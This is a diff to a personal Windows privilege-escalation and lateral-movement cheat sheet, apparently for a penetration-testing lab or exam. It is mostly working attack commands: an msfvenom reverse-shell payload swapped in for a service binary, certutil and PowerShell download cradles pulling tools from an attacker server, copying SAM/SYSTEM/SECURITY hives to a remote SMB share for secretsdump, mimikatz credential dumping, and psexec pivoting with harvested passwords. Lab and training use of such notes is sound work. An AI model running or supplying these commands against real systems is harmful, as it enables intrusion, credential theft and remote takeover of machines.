@@ -254,15 +254,6 @@ Check for credentials in .rdg files
  
  
 ================================== 
-SAM - Quickcheck
-
-dir %SYSTEMROOT%\repair\*S*
-dir %SYSTEMROOT%\System32\config\RegBack\*S*
-dir %SYSTEMROOT%\System32\config\*S*
-
-Consider: mxsam
-
-================================== 
 Unquoted Service Path PrivEsc
 
 searchsploit foxit 7.
@@ -320,11 +311,18 @@ rlwrap nc -nvlp 445
 TOOLS 
  
 cd ~\tools\privesc_windows
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support
-cd C:\windows\temp\
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
+net use \\192.168.49.124\share /USER:mike paxx  
+cd C:\Windows\Temp\
 cd C:\Users\Bob\Downloads\ 
-copy \\192.168.162.46\share\*
- 
+copy winPEASx64.exe \\192.168.49.124\share\
+copy chisel.exe \\192.168.49.124\share\
+copy mimikatz_64.exe \\192.168.49.124\share\
+copy PowerUp.ps1 \\192.168.49.124\share\
+copy SharpHound.exe \\192.168.49.124\share\
+copy nc.exe \\192.168.49.124\share\ 
+copy Invoke-Kerberoast.ps1 \\192.168.49.124\share\  
+
 python3 -m http.server 80
 certutil -urlcache -split -f http://192.168.162.46:80/winPEASx64.exe 
 certutil -urlcache -split -f http://192.168.162.46:80/chisel.exe 
@@ -377,8 +375,18 @@ powershell.exe -nop -ExecutionPolicy bypass
 IEX(New-Object Net.WebClient).downloadString('http://192.168.162.46:80/PowerUp.ps1') 
 Import-Module .\PowerUp.ps1 
 Invoke-AllChecks 
- 
-  
+
+Found Exploitable Service
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=80 -f exe -o mike80.exe 
+webup 80 
+certutil -urlcache -split -f http://192.168.162.46:80/mike80.exe 
+cd C:\xampp\fz\ 
+move fz.exe fz.old 
+move C:\xampp\upload\mike80.exe fz.exe 
+shutdown -r
+nc -nvlp 80
+
+
 ================================== 
 WES – Kernel Checks 
  
@@ -405,23 +413,27 @@ https://book.hacktricks.xyz/windows/active-directory-methodology
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet 
 https://github.com/mchern1kov/pentest-everything/blob/master/privesc/windows/README.md 
 https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/ 
- 
+
  
 ================================== 
-Refresh Tools (this needs work)
- 
-git clone https://github.com/carlospolop/PEASS-ng/releases/ 
-linpeas.sh 
-winPEAS.bat 
-winPEASx64.exe 
-winPEASx86.exe 
- 
-git clone https://github.com/PowerShellMafia/PowerSploit -b dev 
-PowerUp.ps1
- 
-git clone https://github.com/bitsadmin/wesng --depth 1 
-wes.py
- 
+SAM - Quickcheck
+
+dir %SYSTEMROOT%\repair\*S*
+dir %SYSTEMROOT%\System32\config\RegBack\*S*
+dir %SYSTEMROOT%\System32\config\*S*
+
+Consider: mxsam
+================================== 
+SAM
+
+cd C:\Windows\Temp\  
+copy samx \\192.168.119.154\share\  
+copy systemx \\192.168.119.154\share\  
+copy securityx \\192.168.119.154\share\  
+smbup -smb2support -username mike -password paxx  
+net use \\192.168.49.124\share /USER:mike paxx  
+copy *x \\192.168.49.124\share\  
+secretsdump -sam samx -system systemx LOCAL  
  
  
 ================================== 
@@ -431,19 +443,18 @@ mimikatz_64.exe              ..as admin if you can
 privilege::debug  
 token::elevate  
 sekurlsa::logonpasswords     ..auto-logon passwords  
+lsadump::secrets             ..WOW saved creds!!  
 
 sekurlsa::dpapi              ..extract DPAPI masterkeys 
 dpapi::rdg                   ..decrypt .rdg files (needs masterkey) 
- 
 lsadump::sam                 ..NTLM 
 lsadump::cache               ..MsCacheV2 might crack  
-lsadump::secrets             ..WOW saved creds!!  
 lsadump::lsa /inject         ..? 
- 
 sekurlsa::tickets            ..roast  
 kerberos::list /export       ..after requesting ticket w/powershell  
 klist  
- 
+
+
 ================================== 
 mimikatz powershell
 powershell -ep bypass .\Invoke-Mimikatz.ps1
@@ -465,13 +476,29 @@ http://localhost:7474/browser/
 Right-side menu >  Upload Data > sharphound.zip 
 Analysis > Find Shortest Path to Domain Admins 
  
- 
+
 ================================== 
 Ping for Nearby Machines: 
  
 for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.200.%i > nul && echo 192.168.200.%i is up  
 
+
+================================== 
+Refresh Tools (this needs work)
  
+git clone https://github.com/carlospolop/PEASS-ng/releases/ 
+linpeas.sh 
+winPEAS.bat 
+winPEASx64.exe 
+winPEASx86.exe 
+ 
+git clone https://github.com/PowerShellMafia/PowerSploit -b dev 
+PowerUp.ps1
+ 
+git clone https://github.com/bitsadmin/wesng --depth 1 
+wes.py
+
+
 ================================== 
 Remotes 
 
@@ -483,15 +510,17 @@ dcomexec.py mydom/administrator:"password!"@192.168.200.5
 smbexec.py mydom/administrator:"password!"@192.168.200.5
 wmiexec.py mydom/administrator:"password!"@192.168.200.5
 atexec.py mydom/administrator:"password!"@192.168.200.5 "whoami" 
- 
- 
-==================================  
-Usernames 
-List of Users > Convert to usernames 
-https://github.com/PinkDraconian 
-Then Kerbrute, if you get a list of users. 
 
- 
+================================== 
+Pivot and Pwn
+
+psexec mike.com/sqlserver:sqlpax@10.11.1.123
+psexec mike.com/sqlserver:sqlpax@10.11.1.122
+psexec mike.com/sqlserver:sqlpax@10.11.1.121
+psexec mike.com/sqlserver:sqlpax@10.11.1.120
+psexec mike.com/david:paxx@10.11.1.120 
+secretsdump mike.com/david:paxx@10.11.1.120 
+
 ================================== 
 Proof 
 type proof.txt && whoami && hostname && ipconfig 
